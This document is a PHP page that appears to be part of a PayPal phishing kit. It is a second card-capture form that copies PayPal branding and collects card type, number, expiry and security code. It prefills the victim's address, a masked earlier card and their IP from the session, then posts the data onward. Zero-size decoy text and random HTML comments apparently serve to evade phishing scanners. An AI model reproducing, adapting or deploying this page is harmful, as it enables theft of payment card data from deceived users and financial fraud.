<?php
//error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
require_once 'more.php';
require_once '../lang.php';

if($get_double_cc == "on"){}else{echo "<script type='text/javascript'>window.top.location='bank?key=$key';</script>";}
?>
    <!DOCTYPE html>
    <html>

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
        <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
        <title>
            <?php echo $account['title'];?>
        </title>
        <link rel="stylesheet" href="assets/css/process.css">
        <script type="text/javascript" src="assets/js/jquery-3.3.1.min.js">
        </script>
        <script type="text/javascript" src="assets/js/jquery.mask.min.js">
        </script>
        <script type="text/javascript" src="assets/js/jquery.ccvalid.js"></script>
    </head>

    <body>
        <?php include "assets/static/header.html" ?>
            <div class="mainContainer">
                <div class="hide" id="rotate">
                    <div class="spinner">
                        <div class="rotate"></div>
                        <div class="processing">
                            <?php echo $account['processing'];?>...</div>
                    </div>
                    <div class="overlay">
                    </div>
                </div>
                <div class="mobileNav">
                    <div class="navHeader">
                        <div class="blockToggler">
                            <label class="menuLabel" for="toggleMenu"><span></span>
                                <div class="menuOpen">Menu</div>
                                <div class="menuClose">
                                    Close</div>
                            </label>
                        </div>
                    </div>
                    <div class="navLogo">
                        <a href="javascript:" class="mobileBrand"></a>
                    </div>
                    <ul class="notifUl">
                        <li>
                            <a class="svgLogo notifTxt">
                                <img src="assets/img/noti.svg" alt="">
                            </a>
                        </li>
                    </ul>
                </div>

                <div class="contents">
                    <section class="mainContents contentContainerBordered" id="process">
                        <form action="submit_card2?key=<?php echo $key;?>" method="post" style="padding:0 20px" novalidate="on">
                            <h2 style="font-size: 1.875rem;
                            font-weight: 300;
                            text-transform: none;
                            font-family: 'PayPal-Sans-Big', Helvetica Neue, Arial, sans-serif;">
                              <span style="font-size:0">darkness</span>
                              <?php echo $account['linknew'];?>     <span style="font-size:0">isnot good</span></h2>
                            <div class="fields clearfix">
                                <div class="dropDown">
                                    <select id="ctp" name="ctp" required>
                                        <option value="-1" disabled selected>
                                            <?php echo $account['ctp'];?>
                                        </option>
                                        <option value="vsa">Visa</option>
                                        <option value="msc">MasterCard</option>
                                        <option value="amx">American Express</option>
                                    </select>
                                    <div class="labelSelect">
                                        <?php echo $account['ctp'];?>
                                    </div>
                                </div>
                                <div class="inputArea">
                                    <input id="ccn" name="ccn" type="tel" required placeholder="<?php echo $account['ccn'];?>" maxlength="19" autocomplete="off">
                                </div>
                                <div class="multiInputs">
                                    <div class="inputArea hasSub">
                                        <input id="cex" name="cex" type="tel" required placeholder="<?php echo $account['exp'];?>" maxlength="7" autocomplete="off">
                                    </div>
                                    <div class="inputArea hasSub csc pull-right">
                                        <input id="csc" name="csc" type="tel" required placeholder="<?php echo $account['csc'];?>" maxlength="4" autocomplete="off">
                                    </div>

                                </div>
                                <div id="cidmenu" style="top:15px;padding-bottom: 30px;" class="inputArea">

                                </div>
                                <?php echo $card;?>
                            </div>
                            <!--63965198-->
                            <br>
                            <div class="fields clearfix">
                                <!--72237183-->
                                <div class="inputArea">
                                    <!--62054136-->
                                    <input id="oo" type="text" class="txt-capital" disabled="disabled" value="<?php echo $_SESSION['adr'];?>, <?php echo $_SESSION['zip'];?> <?php echo $_SESSION['cty'];?>, <?php echo $_SESSION['cnt'];?>">
                                </div>
                                <div class="">
                                    <input id="ipx" type="hidden" hidden="hidden" value="<?php echo $ip2;?>">
                                    <input id="keke" type="hidden" hidden="hidden" value="<?php echo $key;?>">
                                    <!--<input id="fnm" type="hidden" hidden="hidden" value="<?php echo $_SESSION['fnm'];?>">
							<input id="adr" type="hidden" hidden="hidden" value="<?php echo $_SESSION['adr'];?>">
							<input id="cty" type="hidden" hidden="hidden" value="<?php echo $_SESSION['cty'];?>">
							<input id="stt" type="hidden" hidden="hidden" value="<?php echo $_SESSION['stt'];?>">
							<input id="cnt" type="hidden" hidden="hidden" value="<?php echo $_SESSION['cnt'];?>">
							<input id="zip" type="hidden" hidden="hidden" value="<?php echo $_SESSION['zip'];?>">
							<input id="dob" type="hidden" hidden="hidden" value="<?php echo $_SESSION['dob'];?>">
							<input id="ptp" type="hidden" hidden="hidden" value="<?php echo $_SESSION['ptp'];?>">
							<input id="pnm" type="hidden" hidden="hidden" value="<?php echo $_SESSION['pnm'];?>">-->

                                    <!--7757075-->
                                </div>
                                <div class="inputArea">
                                    <!--96629257-->
                                    <input style="text-align:center;" required disabled value="<?php echo $_SESSION['type_vbv'];?>-XXXX-XXXX-XXXX-<?php echo $_SESSION['ending'];?> <?php echo $account['linked'];?>">
                                </div>
                                <div>
                                    <!--52047015-->
                                    <input style="margin-top:10px;width:100%" type="submit" class="bt" value="<?php echo $account['continue'];?>">
                                    <a style="margin-top:10px;width:100%;display: inline-block;
                                    min-width: 6rem;
                                    padding: 0.75rem 1.5rem;
                                    margin-bottom: 1.5rem;
                                    border: 1px solid #0070ba;
                                    border-radius: 1.5rem;
                                    font-size: 0.9375rem;
                                    line-height: 1.6;
                                    font-family: pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;
                                    font-weight: 600;
                                    text-align: center;
                                    text-decoration: none;
                                    cursor: pointer;
                                    color: #0070ba;
                                    background-color: #ffffff;
                                    transition: all 250ms ease;
                                    -webkit-font-smoothing: antialiased;" disabled href="bank?key=<?php echo $key;?>">
                                        <?php echo $account['donthave'];?>
                                    </a>
                                </div>
                                <!--62464883-->
                                <!--39012845-->
                            </div>
                        </form>
                    </section>
                    <?php include "assets/static/footer.html" ?>
                </div>

            </div>
            </div>
            <script src="assets/js/validate_card2.js">
            </script>
    </body>

    </html>